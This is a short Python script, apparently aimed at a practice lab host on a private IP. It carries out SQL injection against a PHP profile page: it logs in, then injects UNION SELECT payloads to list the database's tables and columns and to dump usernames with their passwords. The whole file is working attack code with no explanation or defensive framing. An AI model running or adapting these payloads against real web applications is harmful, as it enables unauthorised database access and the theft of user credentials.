from bs4 import BeautifulSoup
import requests


url = 'http://192.168.56.135:2009/profile.php/?id='
payload = "2' UNION SELECT 'a',table_name,NULL,NULL FROM information_schema.tables -- -"


def login(url):
    data = {"uname": "test", "pw": "123"}
    req = requests.post(url, data=data)
    return req


def alltablename(url):
    response = requests.get(url+payload, cookies=login(
        "http://192.168.56.135:2009/login.php").cookies)
    html = response.text
    soup = BeautifulSoup(html, "html.parser")
    table = soup.find(id='table1')
    rows = soup.find_all('tr')
    cols = soup.find_all("td", {'class': "content"})
    for col in cols:
        print(col.text)


def allcolinfo(url, name):
    payload = "2' UNION SELECT 'a',column_name,NULL,NULL FROM information_schema.columns WHERE table_name='" + name + "'-- -"
    response = requests.get(url+payload, cookies=login(
        "http://192.168.56.135:2009/login.php").cookies)
    html = response.text
    soup = BeautifulSoup(html, "html.parser")
    table = soup.find(id='table1')
    rows = soup.find_all('tr')
    cols = soup.find_all("td", {'class': "content"})
    for col in cols:
        print(col.text)


def allInfoOfTable(url):
    payload = "2' UNION SELECT 'a',CONCAT(username,' ',password),NULL,NULL FROM user-- -"
    response = requests.get(url+payload, cookies=login(
        "http://192.168.56.135:2009/login.php").cookies)
    html = response.text
    soup = BeautifulSoup(html, "html.parser")
    table = soup.find(id='table1')
    rows = soup.find_all('tr')
    cols = soup.find_all("td", {'class': "content"})
    for col in cols:
        print(col.text)


allInfoOfTable(url)
